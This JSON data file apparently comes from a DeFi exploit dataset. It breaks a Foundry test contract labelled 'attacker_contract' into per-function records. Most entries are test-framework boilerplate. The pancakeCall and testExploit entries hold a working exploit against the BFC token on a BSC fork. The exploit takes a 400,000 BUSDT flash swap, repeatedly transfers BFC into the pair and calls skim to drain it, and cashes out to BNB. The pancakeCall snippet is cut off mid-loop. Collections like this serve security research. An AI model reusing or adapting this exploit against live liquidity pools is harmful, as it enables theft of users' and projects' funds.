[
  {
    "contract/interface": "BFCTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "BFCTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "BFCTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "BFCTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "BFCTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "BFCTest",
    "source_type": "attacker_contract",
    "function_name": "pancakeCall",
    "original_code": "    function pancakeCall(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) external {\n        BFC.approve(address(Router), type(uint256).max);\n        BUSDT.approve(address(Router), type(uint256).max);\n\n        swapBUSDTToBFC(BUSDT.balanceOf(address(BUSDT_BFC)));\n        BFC.transfer(address(BFC), BFC.balanceOf(address(this)));\n        swapBUSDTToBFC(BUSDT.balanceOf(address(this)));\n        // Start exploit\n        uint256 counter;\n        while (counter < 100) {\n            uint256 balanceBFC = BFC.balanceOf(address(this));\n            uint256 pairBalanceBFC = BFC.balanceOf(address(BUSDT_BFC));\n\n            if (balanceBFC >= (50 * pairBalanceBFC)) {\n                balanceBFC = (pairBalanceBFC - 1) * 50;\n            }\n\n            BFC.transfer(address(BUSDT_BFC), balanceBFC);\n            BUSDT_BFC.skim(address(this));\n            BFC.transfer(address(BUSDT_BFC), 0);\n\n            if (balanceBFC < (pairBalanceBFC * 50)) {\n                ++counter;\n            } else {\n                break;\n            }\n",
    "description": ""
  },
  {
    "contract/interface": "BFCTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"bsc\", 31_599_443);\n        vm.label(address(BUSDT_WBNB), \"BUSDT_WBNB\");\n        vm.label(address(BUSDT_BFC), \"BUSDT_BFC\");\n        vm.label(address(Router), \"Router\");\n        vm.label(address(BFC), \"BFC\");\n        vm.label(address(BUSDT), \"BUSDT\");\n        vm.label(address(WBNB), \"WBNB\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "BFCTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "BFCTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "BFCTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "BFCTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "BFCTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "BFCTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "BFCTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        deal(address(BUSDT), address(this), 0);\n        deal(address(this), 0);\n        bytes memory swapData = abi.encode(address(BFC), address(BUSDT_BFC), 400_000 * 1e18);\n        BUSDT_WBNB.swap(400_000 * 1e18, 0, address(this), swapData);\n        swapBUSDTToBNB();\n\n        emit log_named_decimal_uint(\"Attacker BNB balance after attack\", address(this).balance, 18);\n    }\n\n",
    "description": ""
  }
]